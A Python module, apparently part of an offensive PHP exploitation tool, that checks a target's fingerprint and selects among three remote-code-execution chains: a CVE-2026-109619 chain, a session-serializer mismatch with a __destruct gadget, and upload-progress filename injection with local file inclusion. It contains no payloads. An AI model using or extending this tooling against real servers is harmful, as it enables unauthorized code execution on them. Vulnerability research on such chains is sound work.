"""Strategy decision table: map a TargetProfile to an applicable RCE chain.

Priority order (strongest first):
  rung5b  — CVE-2026-109619 weaponized chain ([UAFDBG] container + docker)
  chain_c — serialize_handler mismatch -> __destruct gadget (portable)
  chain_a — upload-progress filename injection + LFI (portable)

There is no static port/gating table. rung-5b applicability is determined
dynamically: docker is available AND the calibration endpoint answers AND a
[UAFDBG]-instrumented FPM container can be resolved behind the target (via
dockerutil.discover_container). Everything else is a live precondition check
from the fingerprint.
"""

from . import dockerutil

STRATEGY_ORDER = ("rung5b", "chain_c", "chain_a")

EVAL_RUNGB = ("docker + obj_probe.php calibration endpoint + a [UAFDBG]-"
              "instrumented FPM container behind the target")
EVAL_CHAINC = "php_serialize write dir + php read dir (handler mismatch) + loaded __destruct gadget class"
EVAL_CHAINA = "session.upload_progress.enabled=On + reachable application LFI"


def _resolve_rung5b_container(profile):
    """Return (container_name, ok, reason). Caches the resolved container on
    the profile so the engine reuses it."""
    if profile.container:
        return profile.container, True, f"container {profile.container!r} (hint)"
    obj_probe = profile.adapter.obj_probe if profile.adapter else "/obj_probe.php"
    container = dockerutil.discover_container(profile.host, profile.port, obj_probe)
    if container:
        profile.container = container
        return container, True, f"instrumented container {container!r} discovered behind target"
    return None, False, "no [UAFDBG]-instrumented FPM container found behind this target"


def evaluate(profile, cmd):
    """Return list of {key, name, applicable, reason, precondition} in
    priority order."""
    results = []

    rung = {
        "key": "rung5b",
        "name": "rung-5b weaponized chain (CVE-2026-109619)",
        "precondition": EVAL_RUNGB,
    }
    if not dockerutil.docker_available():
        rung["applicable"], rung["reason"] = False, "docker CLI unavailable (needed to read the [UAFDBG] oracle)"
    elif not profile.obj_probe_ok:
        rung["applicable"], rung["reason"] = False, "obj_probe.php calibration endpoint absent"
    else:
        container, ok, reason = _resolve_rung5b_container(profile)
        if not ok:
            rung["applicable"], rung["reason"] = False, reason
        else:
            rung["applicable"], rung["reason"] = True, reason
    results.append(rung)

    chainc = {
        "key": "chain_c",
        "name": "Chain C: handler mismatch -> __destruct gadget",
        "precondition": EVAL_CHAINC,
    }
    if not profile.handler_mismatch:
        chainc["applicable"], chainc["reason"] = False, "no php_serialize/php handler mismatch across dirs"
    elif not profile.gadget_ok:
        chainc["applicable"], chainc["reason"] = False, "no loaded __destruct gadget class at the read endpoint"
    else:
        chainc["applicable"], chainc["reason"] = True, "handler mismatch + gadget present"
    results.append(chainc)

    chaina = {
        "key": "chain_a",
        "name": "Chain A: upload-progress filename injection + LFI",
        "precondition": EVAL_CHAINA,
    }
    if profile.upload_progress is False:
        chaina["applicable"], chaina["reason"] = False, "session.upload_progress disabled"
    elif not profile.lfi_ok:
        chaina["applicable"], chaina["reason"] = False, "no reachable LFI endpoint"
    else:
        chaina["applicable"], chaina["reason"] = True, "upload_progress on + LFI reachable"
    results.append(chaina)

    return results


def pick(results, force=None):
    """Pick a strategy from precomputed evaluate() results, honoring an
    explicit --strategy override. Returns (key, reason) or (None, reason)."""
    by_key = {r["key"]: r for r in results}
    if force and force != "all":
        if force not in by_key:
            return None, f"unknown strategy {force!r} (choices: {STRATEGY_ORDER})"
        r = by_key[force]
        if not r["applicable"]:
            return None, f"forced strategy {force!r} not applicable: {r['reason']}"
        return force, r["reason"]
    for key in STRATEGY_ORDER:
        r = by_key[key]
        if r["applicable"]:
            return key, r["reason"]
    return None, "; ".join(f"{k}: {by_key[k]['reason']}" for k in STRATEGY_ORDER)


def select(profile, cmd, force=None):
    """Convenience wrapper: evaluate() + pick()."""
    return pick(evaluate(profile, cmd), force=force)